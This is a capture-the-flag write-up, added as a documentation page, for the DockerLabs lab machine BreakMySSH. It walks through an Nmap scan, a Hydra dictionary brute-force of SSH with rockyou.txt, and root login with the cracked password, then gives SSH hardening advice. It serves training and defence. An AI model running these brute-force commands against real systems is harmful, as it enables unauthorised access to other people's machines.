@@ -1,0 +1,172 @@
+---
+title: "BreakMySSH: Brute Force SSH Access on DockerLabs"
+sidebarTitle: "BreakMySSH"
+description: "Writeup for BreakMySSH on DockerLabs (Very Easy): use Nmap to discover SSH, then brute force credentials with Hydra using rockyou.txt to gain root access."
+---
+
+BreakMySSH is one of the most straightforward machines on DockerLabs — and deliberately so. Its single objective is to teach the mechanics of a dictionary-based SSH brute-force attack using **Hydra**. There is no web enumeration, no steganography, and no privilege escalation chain: the attack goes from zero to root in a single Hydra command. That simplicity makes it perfect for building muscle memory around the brute-force workflow before moving on to more complex machines.
+
+<Note>
+**Machine Info**
+
+| Field | Details |
+|---|---|
+| Difficulty | Very Easy (Muy Fácil / Súper Fácil) |
+| Category | Hacking Infraestructura |
+| OS | Linux (Debian 12 Bookworm) |
+| Key Techniques | Port scanning, SSH brute force |
+| Default Target IP | 172.17.0.2 |
+</Note>
+
+## Phase 0: Launch Kali Portable
+
+Open a second terminal and start your Kali Portable environment:
+
+```bash
+./run-kali.sh normal
+```
+
+All commands below are executed **inside** this Kali Portable session.
+
+## Phase 1: Deploy the Machine
+
+Download `breakmyssh.zip` from DockerLabs. In your first terminal:
+
+```bash
+unzip breakmyssh.zip
+chmod +x auto_deploy.sh
+./auto_deploy.sh breakmyssh.tar
+```
+
+The deploy script outputs the container's IP address. The two files you receive are:
+- `auto_deploy.sh` — Bash script that launches the containerised machine
+- `breakmyssh.tar` — The vulnerable Docker image
+
+## Phase 2: Reconnaissance
+
+<Steps>
+  <Step title="Ping Check">
+    Confirm the machine is alive before scanning:
+
+    ```bash
+    ping -c 3 172.17.0.2
+    ```
+  </Step>
+
+  <Step title="Nmap Port Scan">
+    Run a version-detection and default-script scan:
+
+    ```bash
+    nmap -sC -sV --min-rate 2000 172.17.0.2
+    ```
+
+    | Argument | Meaning |
+    |---|---|
+    | `-sC` | Runs default NSE scripts |
+    | `-sV` | Detects service and version info |
+    | `--min-rate 2000` | Minimum packet rate for speed (use carefully in real tests) |
+
+    **Findings:**
+
+    | Port | Service | Version |
+    |---|---|---|
+    | 22/tcp | SSH | OpenSSH 9.2p1 (Debian 12 Bookworm) |
+
+    Only **port 22** is open. No web server, no FTP — SSH is the only way in.
+
+    ```
+    22/tcp open  ssh  OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+    | ssh-hostkey:
+    |   256 ...
+    ```
+
+    **Vulnerability analysis:** No known critical CVEs affect OpenSSH 9.2p1. This machine is not about exploiting a software vulnerability — it is about exploiting a weak password.
+
+    <Warning>
+    In a real penetration test, skip `--min-rate`. A conservative timing profile (`-T2` or `-T3`) combined with `-sS` (SYN scan) is far less likely to trigger IDS/IPS or rate-limiting controls.
+    </Warning>
+  </Step>
+</Steps>
+
+## Phase 3: SSH Brute Force with Hydra
+
+Since there is only an SSH service and no other enumeration path, we go straight to a credential attack. The approach is to test a list of common usernames against the full `rockyou.txt` wordlist.
+
+```bash
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+      -P /usr/share/wordlists/rockyou.txt \
+      ssh://172.17.0.2 \
+      -t 4
+```
+
+| Argument | Meaning |
+|---|---|
+| `-L usernames.txt` | Wordlist of usernames to try |
+| `-P rockyou.txt` | Password wordlist |
+| `ssh://172.17.0.2` | Target protocol and IP |
+| `-t 4` | 4 threads — low enough to avoid overwhelming the SSH daemon |
+
+**Result:** Hydra finds valid credentials. The discovered user is **`root`** with the password **`estrella`**.
+
+```
+[22][ssh] host: 172.17.0.2   login: root   password: estrella
+```
+
+<Info>
+The `-t 4` flag keeps the thread count low. SSH servers can close connections or temporarily block IPs if too many simultaneous authentication attempts arrive. In this Docker environment, higher thread counts work fine, but 4 threads is a good habit for real-world testing.
+</Info>
+
+## Phase 4: Access and Verification
+
+Connect to the machine using the credentials Hydra found:
+
+```bash
+ssh root@172.17.0.2
+# Password: estrella
+```
+
+Verify your access level:
+
+```bash
+whoami
+# root
+
+id
+# uid=0(root) gid=0(root) groups=0(root)
+```
+
+You landed directly as `root`. No privilege escalation required — the machine was configured with root SSH login enabled and a weak password.
+
+Explore the system and capture the flag:
+
+```bash
+ls /root
+cat /root/flag.txt
+```
+
+<Note>
+Because we obtained root credentials directly via brute force, there is no privilege escalation step on this machine. The vulnerability is entirely in the password choice and SSH configuration — not in any Linux permission model flaw.
+</Note>
+
+## Post-Lab Cleanup
+
+Press `Ctrl+C` in your deploy terminal to stop and remove the container. Type `exit` in the Kali Portable terminal to close your session.
+
+## Key Takeaways
+
+This machine demonstrates three compounding security failures that are all too common in real environments:
+
+<CardGroup cols={2}>
+  <Card title="Root SSH Login Is Dangerous" icon="triangle-exclamation">
+    Allowing direct `root` login over SSH eliminates the need for privilege escalation entirely. Set `PermitRootLogin no` in `/etc/ssh/sshd_config` and always require privilege escalation from a regular account.
+  </Card>
+  <Card title="Weak Passwords Are Easily Cracked" icon="key">
+    The password `estrella` is found in `rockyou.txt` within seconds. A strong, randomly generated password of 16+ characters would have made this attack impractical. A passphrase is even better.
+  </Card>
+  <Card title="SSH Keys Beat Passwords" icon="lock">
+    The most effective defence against SSH brute force is disabling password authentication entirely and requiring key-based auth. Set `PasswordAuthentication no` in `sshd_config` once you have deployed your public key.
+  </Card>
+  <Card title="Fail2Ban Stops Hydra" icon="shield">
+    Even with a weak password, `fail2ban` would have blocked Hydra after a configurable number of failed attempts (typically 5). Install it with `apt install fail2ban` and enable the SSH jail as a minimum baseline.
+  </Card>
+</CardGroup>
